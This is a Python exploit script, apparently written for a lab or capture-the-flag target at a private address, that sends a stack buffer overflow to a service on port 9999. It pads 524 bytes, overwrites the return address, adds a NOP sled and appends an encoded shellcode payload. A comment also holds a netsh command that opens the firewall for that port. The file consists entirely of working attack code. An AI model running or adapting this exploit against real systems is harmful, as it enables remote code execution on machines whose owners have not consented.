import socket

ip = "10.10.221.31"
port = 9999

offset = 524
overflow = b'A' * offset
retn = b'\xf3\x12\x17\x31'
padding = b'\x90' * 16
payload = (b"\xda\xcd\xd9\x74\x24\xf4\xb8\xe7\x47\xb0\x5f\x5a"
b"\x29\xc9\xb1\x1f\x31\x42\x1a\x03\x42\x1a\x83\xc2"
b"\x04\xe2\x12\x2d\xba\x01\xed\x69\x4d\x5e\x5e\xcd"
b"\xe1\xcb\x62\x61\x63\x85\x83\x4c\xec\x02\x18\x27"
b"\xe7\x25\x9f\x48\x9f\x37\x9f\xa7\x3c\xb1\x7e\xad"
b"\xda\x99\xd0\x63\x74\x93\x31\xc0\xb7\x23\x34\x07"
b"\x3e\x3d\x78\xfc\xfc\x55\x26\xfc\xfe\xa5\x7e\x97"
b"\xfe\xcf\x7b\xee\x1c\x3e\x4a\x3d\x62\xc4\x8c\xc7"
b"\xde\x2c\x2b\x8a\x26\x0a\x33\xfa\x28\x6c\xba\x19"
b"\xe9\x87\xb0\x1c\x09\x5b\x78\xe3\x03\xe4\xfd\xdc"
b"\xe4\xf5\xa6\x55\xf5\x6f\xea\x42\x46\x8c\xc7\x0b"
b"\x23\x53\xaf\x09\xd3\xb5\xf7\x0f\x2b\x36\x07\xab"
b"\x2a\x36\x07\xcb\xe1\xb6")

buffer =  overflow + retn + padding + payload

#buffer =  overflow + retn + padding + pyload +
      
# netsh advfirewall firewall add rule nam="ALLOTCP PORT 9999" dir=in action=allow protocol=TCP localport=9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...:")
  #try:
  #  s.recv(1024)
  #except Exception as e:
  #  print("33 - Exception: %s" %e)

  #try:  
  #  s.send(b'NameTest' + b'\r\n')
  #except Exception as e:
  #  print("38 - Exception: %s" %e)

  try:
    s.recv(1024)
  except Exception as e:
    print("42 - Exception: %s" %e)

  try: 
    s.send((buffer + b'\r\n'))
  except Exception as e:
    print("47 - Exception: %s" %e)

  try: 
    s.recv(1024)
  except Exception as e:
    print("52 - Exception: %s" %e)
  s.close()
  #s.send(bytes("NameTest" + "\r\n", "latin-1"))
  #s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")